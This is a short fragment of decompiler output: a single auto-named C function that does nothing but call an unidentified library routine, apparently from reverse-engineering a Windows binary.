void __fastcall sub_14002C84C()
{
  unknown_libname_47();
}


